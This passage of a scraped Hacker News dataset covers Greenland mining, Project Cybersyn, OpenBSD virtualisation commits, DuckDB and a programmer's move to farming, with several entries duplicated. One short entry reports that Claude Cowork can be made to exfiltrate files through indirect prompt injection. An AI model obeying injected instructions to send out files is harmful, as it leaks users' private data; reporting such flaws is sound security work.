humans, especially when it suits them. But they are quick to leave when curiosity or opportunity calls.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Why Greenland's natural resources are nearly impossible to mine", "url": "https://theweek.com/world-news/greenland-natural-resources-impossible-mine", "content": "Why Greenland's natural resources are nearly impossible to mine. President Donald Trump has renewed his efforts to take over Greenland, and tapping into the Danish territory’s natural resources is a key part of the strategy. But even if Trump were to somehow make Greenland a U.S. territory (something Denmark vehemently opposes), experts say the island’s harsh climate and environment make mining Greenland’s natural resources an unachievable goal. Greenland has significant supplies of rare earth elements. These 17 metals, with “exotic-sounding names like terbium and neodymium, are vital for many everyday technologies,” saidthe BBC. Household items like televisions and smartphones would “not work without them.” Trumpwants to tap intoGreenland’s supply of rare earth minerals as part of an effort to overtake China, the country that currently “controls the world’s supply,” said Tony Sage, the CEO of Critical Metals, to the BBC. But rare earth minerals are not Greenland’sonly natural resource. Many “occurrences of graphite and graphite schist are reported from many localities on the island,” saidReuters. Other minerals commonly found in the territory include diamonds, gold, nickel, titanium, tungsten, zinc and more, according to Greenland’s Mineral Resources Authority. Escape your echo chamber. Get the facts behind the news, plus analysis from multiple perspectives. From our morning news briefing to a weekly Good News Newsletter, get the best of The Week delivered directly to your inbox. From our morning news briefing to a weekly Good News Newsletter, get the best of The Week delivered directly to your inbox. The island’s frigid, Arctic climate serves as the main culprit for challenging mining. Most of Greenland’s natural resources are “located in remote areas above the Arctic Circle, where there is a mile-thick polar ice sheet and darkness reigns much of the year,” saidCNN. While people may understandably think neighboring Iceland is blanketed by ice, Greenland actually has the harsher climate; about “80% of Greenland is covered with ice,” and mining the “Arctic can be five to 10 times more expensive than doing it elsewhere on the planet.” As a result, most of the efforts to mine Greenland’s minerals “generally haven’t advanced beyond the exploratory stage,” saidThe Associated Press. And beyond the weather playing a major factor, the remote areas where many of these elements are located also present a problem. Even in southern Greenland, where the island is “populated, there are few roads and no railways, so any mining venture would have to create these accessibilities,” said Diogo Rosa, an economic geology researcher with the Geological Survey of Denmark and Greenland, to the AP. There is also the question of power, as many of these remote areas don’t have consistent electricity. As of now, Greenland only has one fully operational mine, which produces anorthosite and is “located deep inside a fjord system with no road access,” saidBusiness Insider. All of the mine’s supplies, including the crew, “arrives by ship during the ice-free months or by helicopter when the fjord freezes over for months on end.” And there may not be another operational mine for a while; on average it “takes 16 years to develop a mine, right from the first idea to the actual mine,” Naaja Nathanielsen, Greenland’s minister responsible for natural resources, said to Business Insider. It is clear that the “Trump administration might want to dominate the Arctic, not least to gain relative power overRussiaand China,” Lukas Slothuus, a postdoctoral research fellow at the U.K.’s University of Sussex, said atThe Conversation. But given the challenges with mining, any “natural resource extraction is unlikely to feature centrally.” Ifforeign powersdid find a way to mine in Greenland, this would “reverberate in Copenhagen, as Greenland has a mining profit-sharing agreement with Denmark.”", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "IRISC: An ARMv7 assembly interpreter and computer architecture simulator", "url": "https://polysoftit.co.uk/irisc-web/", "content": "IRISC: An ARMv7 assembly interpreter and computer architecture simulator", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "psc: The ps utility, with an eBPF twist and container context", "url": "https://github.com/loresuso/psc", "content": "psc: The ps utility, with an eBPF twist and container context", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Dock – Slack minus the bloat, tax, and 90-day memory loss", "url": "https://getdock.io/", "content": "Show HN: Dock – Slack minus the bloat, tax, and 90-day memory loss. Your time. Your decisions. Your sanity.Team chat that just works. Async messages for deep work. Real-time chat when it matters. Work across timezones without the noise. Decisions get lost in chat. Not here. One click to mark, instant recall months later from your Decisions inbox. Secure infrastructure. Your data encrypted in transit and at rest. Switching from Slack or Teams? One-click import and export. Your data stays yours.Learn more → The feature Slack charges $8.75/user for? Free on Dock. Find any message, from any time. No 90-day cutoff. No upgrade required. Your entire team history, always at your fingertips — completely free. No learning curve. No feature overwhelm. Create a channel, invite your team, start talking. It's chat — we didn't reinvent it. No surprises when your team grows. One price for your whole team. 100+ members?Contact us *Subject tofair usage policy", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Project Cybersyn", "url": "https://en.wikipedia.org/wiki/Project_Cybersyn", "content": "Project Cybersyn.  Project Cybersynwas aChileanproject from 1971 to 1973 during thepresidency of Salvador Allendeaimed at constructing a distributeddecision support systemto aid in the management of thenational economy. The project consisted of four modules: an economic simulator; custom software to check factory performance; an operations room; and a national network oftelexmachines that were linked to one mainframe computer.[2] Project Cybersyn was based onviable system modeltheory approach toorganizational designand featured innovative technology for its time. It included a network of telex machines (Cybernet) in state-run enterprises that would transmit and receive information to and from the government inSantiago. Information from the field would be fed into statistical modeling software (Cyberstride) that would monitor production indicators, such as raw material supplies or high rates of worker absenteeism. It alerted workers in near real time. If parameters fell significantly outside acceptable ranges, it notified the central government. The information would also be input into economic simulation software (CHECO, for CHilean ECOnomic simulator). The government could use this to forecast the possible outcome of economic decisions. Finally, a sophisticated operations room (Opsroom) would provide a space where managers could see relevant economic data. They would formulate feasible responses to emergencies and transmit advice and directives to enterprises and factories in alarm situations by using the telex network. The principal architect of the system was Britishoperations researchscientistStafford Beer, and the system embodied his notions ofmanagement cyberneticsin industrial management. One of its main objectives was to devolve decision-making power within industrial enterprises to their workforce to develop self-regulation of factories. Project Cybersyn was ended with Allende's removal and subsequent death during the1973 Chilean coup d'état. After the coup, Cybersyn was abandoned and the operations room was destroyed.[3] The project's name in English ('Cybersyn') is aportmanteauof the words 'cybernetics' and 'synergy'. Since the name is noteuphonicin Spanish, in that language the project was calledSynco, both aninitialismfor the SpanishSistema de Información y Control('System of Information and Control'), and a pun on the Spanishcinco, the number 5, alluding to the 5 levels of Beer'sviable system model.[4] A few dozen of teleprinters acquired by the previous administration,[5]and not 500 as previously reported,[6]were then put into factories. Each factory would send quantified indices of production processes such as raw material input, production output, number of absentees, etc.[7]These indices would later feed a statistical analysis program that, running on a mainframe computer in Santiago, would make short-term predictions about the factories' performance and suggest necessary adjustments,[8]which, after discussion in an operations room, would be fed back to the factories. This process occurred at 4 levels: firm, branch, sector, and total. A fundamental phase of the project was to quantify the production processes in the factories. This began with operational research (OR) engineers visiting the factories and modeling their production flows using a technique that Beer and the local team called \"quantified flowcharting\".[9]It consisted of drawing a flowchart of the entire production process of a given factory, focusing on the \"bottlenecks\" of such a process.[10]The connections from one point in the process to another had to be quantified in order to find those bottlenecks. This was a time-consuming process, for which only one OR engineer was assigned to model a given factory. This is likely the reason why, at the end of the project, only about twenty factories were modeled and connected to the transmission and processing system.[11] Once a factory was modeled, it was necessary to collect indices of processes on a daily basis. The \"quantified flowcharting\" technique used by the project team explicitly required the modelers to rely on the factory operators' knowledge of their own relationships to their machines to generate these indices.[12]This is reminiscent of earlier bottom-up cybernetic processes, such as those signaled by Pasquinelli in his article \"Italian Operaismo and the Information Machine\".[13]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The URL shortener that makes your links look as suspicious as possible", "url": "https://creepylink.com/", "content": "The URL shortener that makes your links look as suspicious as possible. The URL shortener that makes your links lookas suspicious as possible. Normal links are too trustworthy. Make them creepy. Your suspiciously shortened URL: Copied to clipboard! For urgent issues, contact support at[email deobfuscation failed]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Claude Cowork exfiltrates files", "url": "https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files", "content": "Claude Cowork exfiltrates files. Solutions Industries Partners Resources Book a Demo Threat Intelligence Table of Content Table of Content Table of Content Claude Cowork is vulnerable to file exfiltration attacks via indirect prompt injection as a result of known-but-unresolved isolation flaws in Claude's code execution environment.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "AI Is Not Ready to Replace Junior Devs Says Ruby on Rails Creator", "url": "https://www.finalroundai.com/blog/ai-can-not-replace-junior-programmers", "content": "AI Is Not Ready to Replace Junior Devs Says Ruby on Rails Creator. ‍ Right now, the popular Silicon Valley narrative is that companies won’t need large teams of real programmers anymore. But outside that bubble, many people working in real teams don’t see it that way at all. David Heinemeier Hansson, the creator of Ruby on Rails, believes AI is not as good as most junior programmers for coding, at least as of right now. David Heinemeier Hansson, also known as DHH, built Ruby on Rails, one of the most influential web frameworks. He still writes code and deals with the messy realities of production. So, when he talks about coding, he is speaking from hands-on experience, not hype. In the Next Token podcast, David discussed the uncertain impact of AI on the tech landscape. ‍ ‍ He compared current AI tools to a “flickering” light bulb, something that sometimes gives a useful glimpse but often leaves developers in the dark: ‍ Sounds like he is trying to explain his frustration with AI.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "OpenBSD-current now runs as guest under Apple Hypervisor", "url": "https://www.undeadly.org/cgi?action=article;sid=20260115203619", "content": "OpenBSD-current now runs as guest under Apple Hypervisor. Contributed byPeter N. M. Hansteenon2026-01-15from the hyper-armed dept. The commits readList:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Helg Bredow <helg () cvs ! openbsd ! org>\r\nDate:       2026-01-12 18:15:33\r\n\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\thelg@cvs.openbsd.org\t2026/01/12 11:15:33\r\n\r\nModified files:\r\n\tsys/dev/pv     : viogpu.c \r\n\r\nLog message:\r\nviogpu_wsmmap() returns a kva but instead should return a physical\r\naddress viabus_dmamem_mmap(9). Without this, QEMU would only show a\r\nblack screen when starting X11. On the Apple Hypervisor, the kernel\r\nwould panic.Also add calls to bus_dmamap_sync(9) before transferring the framebuffer\r\nto host memory. It was working for me without this, but this ensures\r\nthat the host running on another CPU will see updates to the\r\nframebuffer.\r\n\r\nThanks to kettenis@ for reviewing and providing feedback.\r\n\r\nok sf@andList:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Stefan Fritsch <sf () cvs ! openbsd ! org>\r\nDate:       2026-01-15 9:06:19\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\tsf@cvs.openbsd.org\t2026/01/15 02:06:19\r\n\r\nModified files:\r\n\tsys/dev/pv     : if_vio.c \r\n\r\nLog message:\r\nvio: Support MTU feature\r\n\r\nAdd support for the VIRTIO_NET_F_MTU which allows to get the hardmtu\r\nfrom the hypervisor. Also set the current mtu to the same value. The\r\nvirtio standard is not clear if that is recommended, but Linux does\r\nthis, too.\r\n\r\nUse ETHER_MAX_HARDMTU_LEN as upper hardmtu limit instead of MAXMCLBYTES,\r\nas this seems to be more correct.\r\n\r\nIf the hypervisor requests a MTU larger than ETHER_MAX_HARDMTU_LEN,\r\nredo feature negotiation without VIRTIO_NET_F_MTU.\r\n\r\nWith this commit, OpenBSD finally works on Apple Virtualization.\r\n\r\nInput and testing from @helg\r\n\r\nok jan@This development will be most welcome for those of us who run with newerApple SiliconMac models.As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! List:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Helg Bredow <helg () cvs ! openbsd ! org>\r\nDate:       2026-01-12 18:15:33\r\n\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\thelg@cvs.openbsd.org\t2026/01/12 11:15:33\r\n\r\nModified files:\r\n\tsys/dev/pv     : viogpu.c \r\n\r\nLog message:\r\nviogpu_wsmmap() returns a kva but instead should return a physical\r\naddress viabus_dmamem_mmap(9). Without this, QEMU would only show a\r\nblack screen when starting X11. On the Apple Hypervisor, the kernel\r\nwould panic.Also add calls to bus_dmamap_sync(9) before transferring the framebuffer\r\nto host memory. It was working for me without this, but this ensures\r\nthat the host running on another CPU will see updates to the\r\nframebuffer.\r\n\r\nThanks to kettenis@ for reviewing and providing feedback.\r\n\r\nok sf@andList:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Stefan Fritsch <sf () cvs ! openbsd ! org>\r\nDate:       2026-01-15 9:06:19\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\tsf@cvs.openbsd.org\t2026/01/15 02:06:19\r\n\r\nModified files:\r\n\tsys/dev/pv     : if_vio.c \r\n\r\nLog message:\r\nvio: Support MTU feature\r\n\r\nAdd support for the VIRTIO_NET_F_MTU which allows to get the hardmtu\r\nfrom the hypervisor. Also set the current mtu to the same value. The\r\nvirtio standard is not clear if that is recommended, but Linux does\r\nthis, too.\r\n\r\nUse ETHER_MAX_HARDMTU_LEN as upper hardmtu limit instead of MAXMCLBYTES,\r\nas this seems to be more correct.\r\n\r\nIf the hypervisor requests a MTU larger than ETHER_MAX_HARDMTU_LEN,\r\nredo feature negotiation without VIRTIO_NET_F_MTU.\r\n\r\nWith this commit, OpenBSD finally works on Apple Virtualization.\r\n\r\nInput and testing from @helg\r\n\r\nok jan@This development will be most welcome for those of us who run with newerApple SiliconMac models.As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! andList:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Stefan Fritsch <sf () cvs ! openbsd ! org>\r\nDate:       2026-01-15 9:06:19\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\tsf@cvs.openbsd.org\t2026/01/15 02:06:19\r\n\r\nModified files:\r\n\tsys/dev/pv     : if_vio.c \r\n\r\nLog message:\r\nvio: Support MTU feature\r\n\r\nAdd support for the VIRTIO_NET_F_MTU which allows to get the hardmtu\r\nfrom the hypervisor. Also set the current mtu to the same value. The\r\nvirtio standard is not clear if that is recommended, but Linux does\r\nthis, too.\r\n\r\nUse ETHER_MAX_HARDMTU_LEN as upper hardmtu limit instead of MAXMCLBYTES,\r\nas this seems to be more correct.\r\n\r\nIf the hypervisor requests a MTU larger than ETHER_MAX_HARDMTU_LEN,\r\nredo feature negotiation without VIRTIO_NET_F_MTU.\r\n\r\nWith this commit, OpenBSD finally works on Apple Virtualization.\r\n\r\nInput and testing from @helg\r\n\r\nok jan@This development will be most welcome for those of us who run with newerApple SiliconMac models.As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! List:       openbsd-cvs\r\nSubject:    CVS: cvs.openbsd.org: src\r\nFrom:       Stefan Fritsch <sf () cvs ! openbsd ! org>\r\nDate:       2026-01-15 9:06:19\r\n\r\nCVSROOT:\t/cvs\r\nModule name:\tsrc\r\nChanges by:\tsf@cvs.openbsd.org\t2026/01/15 02:06:19\r\n\r\nModified files:\r\n\tsys/dev/pv     : if_vio.c \r\n\r\nLog message:\r\nvio: Support MTU feature\r\n\r\nAdd support for the VIRTIO_NET_F_MTU which allows to get the hardmtu\r\nfrom the hypervisor. Also set the current mtu to the same value. The\r\nvirtio standard is not clear if that is recommended, but Linux does\r\nthis, too.\r\n\r\nUse ETHER_MAX_HARDMTU_LEN as upper hardmtu limit instead of MAXMCLBYTES,\r\nas this seems to be more correct.\r\n\r\nIf the hypervisor requests a MTU larger than ETHER_MAX_HARDMTU_LEN,\r\nredo feature negotiation without VIRTIO_NET_F_MTU.\r\n\r\nWith this commit, OpenBSD finally works on Apple Virtualization.\r\n\r\nInput and testing from @helg\r\n\r\nok jan@This development will be most welcome for those of us who run with newerApple SiliconMac models.As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! This development will be most welcome for those of us who run with newerApple SiliconMac models.As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! As always, if you have the hardware and the capacity, please take this for a spin (in snapshots now), and report! Reply I use UTM, which I consider just a wrapper around qemu and Apple virtualisation, but I didn't dig into it. I did't have the issue with a kernel panicking, but I confirm, that it can run X properly now using a snapshot, which didn't work with 7.8 release.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Why DuckDB is my first choice for data processing", "url": "https://www.robinlinacre.com/recommend_duckdb/", "content": "Why DuckDB is my first choice for data processing. Originally posted:2025-03-16.View source code for this pagehere. Over the past few years, I've found myself using DuckDB more and more for data processing, to the point where I now use it almost exclusively, usually from within Python. We're moving towards a simpler world where most tabular data can be processed on a single large machine1and the era of clusters is coming to an end for all but the largest datasets.2 This post sets out some of my favourite features of DuckDB that set it apart from other SQL-based tools.    In a nutshell, it's simple to install, ergonomic, fast, and more fully featured. Anearlier postexplains why I favour SQL over other APIs such asPolars,pandasordplyr. DuckDB is an open source in-process SQL engine that is optimised for analytics queries. The performance difference of analytics-optimised engines (OLAP) vs. transactions-optimised engines (OLTP) should not be underestimated. A query running in DuckDB can be 100 or even 1,000 times faster than exactly the same query running in (say) SQLite or Postgres. A core use-case of DuckDB is where you have one or more large datasets on disk in formats likecsv,parquetorjsonwhich you want to batch process.  You may want to perform cleaning, joins, aggregation, derivation of new columns - that sort of thing. But you can also use DuckDB for many other simpler tasks like viewing a csv file from the command line. DuckDB consistently benchmarks as one of the fastest data processing engines.  The benchmarks I've seen3show there's not much in it between the leading open source engines - which at the moment seem to bepolars,DuckDB,DataFusion,SparkandDask.  Spark and Dask can be competitive on large data, but slower on small data.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "25 Years of Wikipedia", "url": "https://wikipedia25.org", "content": "25 Years of Wikipedia", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Poking holes into bytecode with peephole optimisations", "url": "https://xnacly.me/posts/2026/purple-garden-first-optimisations/", "content": "Poking holes into bytecode with peephole optimisations. This article highlights the first optimizations I made while redesigning and\nsemi-porting the runtime from C to Rust. These aren’t benchmarked or verified,\nsince the virtual machine is currently under construction and will probably be\nfinished this week. At a high level, purple-garden current works like this, with(2+3)*(4-1)as\nan exemplary input: Peephole optimisationsare, as the name implies, optimisations performed on a small section of a\nlarger input. For a virtual machine, like purple-garden this means using a\nwindow of size3(anything larger is no longer local1subject to IR\noptimisation, not peephole and will have happened before peephole optimisation\nis reached in the compilation pipeline) and merging operators, rewriting\nredundant or useless operations. So to summarize: For purple garden specifics and questions regarding the runtime, do consult: Peephole optimisations in purple-garden are intentionally kept single pass to\nkeep startup time cost as low as possible and to move heavy optimisation into\nthe IR. This introduces the problem for recursive optimisations due to the result of a\nprevious optimisation, this is mitigated by peephole optimisations being the\nfallback for the previous optimisation pipeline. Since optimisations can both rewrite, replace and remove instructions, theOp::Nopencodes removal by being the replacement for instructions that were\noptimised away. These are then removed from the bytecode list after all\noptimisations are applied. “Self move” is amovinstruction having equivalentdstandsrc: If this pattern is encountered, the VM would waste processing power on running\naNOPinstruction, to combat this, they are removed:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Have Taken Up Farming", "url": "https://dylan.gr/1768295794", "content": "Have Taken Up Farming. Disclaimer: These are my personal views and do not represent any organization or professional advice. #lifeTue, 13 Jan 2026 11:16:34 +0200Have Taken Up FarmingMy name is Dylan Araps and I used to be a software engineer, best known for my open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible)0. In 2021, without explanation and without telling anyone, I vanished from the internet. My usage of the internet became strictly \"read only\".In 2024, I appeared briefly to tell the world I retired and had \"taken up farming\"1. The vagueness of my message and strangeness surrounding its circumstances created a lot of buzz. It is not every day a person in a cushy, intellectual career drops everything and pivots to working outdoors with their body. It was amusing to read the theories people came up with: from driving a tractor up and down massive tracts of land to being holed up in a Kaczynskiesque cabin in the woods.Today, I return to the internet to tell my story and announcehttps://WILD.gr.For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 Tue, 13 Jan 2026 11:16:34 +0200Have Taken Up FarmingMy name is Dylan Araps and I used to be a software engineer, best known for my open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible)0. In 2021, without explanation and without telling anyone, I vanished from the internet. My usage of the internet became strictly \"read only\".In 2024, I appeared briefly to tell the world I retired and had \"taken up farming\"1. The vagueness of my message and strangeness surrounding its circumstances created a lot of buzz. It is not every day a person in a cushy, intellectual career drops everything and pivots to working outdoors with their body. It was amusing to read the theories people came up with: from driving a tractor up and down massive tracts of land to being holed up in a Kaczynskiesque cabin in the woods.Today, I return to the internet to tell my story and announcehttps://WILD.gr.For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 My name is Dylan Araps and I used to be a software engineer, best known for my open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible)0. In 2021, without explanation and without telling anyone, I vanished from the internet. My usage of the internet became strictly \"read only\".In 2024, I appeared briefly to tell the world I retired and had \"taken up farming\"1. The vagueness of my message and strangeness surrounding its circumstances created a lot of buzz. It is not every day a person in a cushy, intellectual career drops everything and pivots to working outdoors with their body. It was amusing to read the theories people came up with: from driving a tractor up and down massive tracts of land to being holed up in a Kaczynskiesque cabin in the woods.Today, I return to the internet to tell my story and announcehttps://WILD.gr.For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, 